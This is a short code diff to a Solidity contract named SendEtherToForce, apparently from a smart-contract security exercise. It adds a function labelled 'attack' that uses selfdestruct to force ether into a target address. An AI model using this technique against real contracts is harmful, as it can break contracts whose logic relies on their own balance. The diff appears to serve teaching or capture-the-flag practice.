@@ -18,5 +18,9 @@ contract SendEtherToForce {
         require(ok, "Transfer failed");
     }
 
+    function attack(address payable _force) external payable {
+        selfdestruct(_force);
+    }
+
     receive() external payable {}
 }
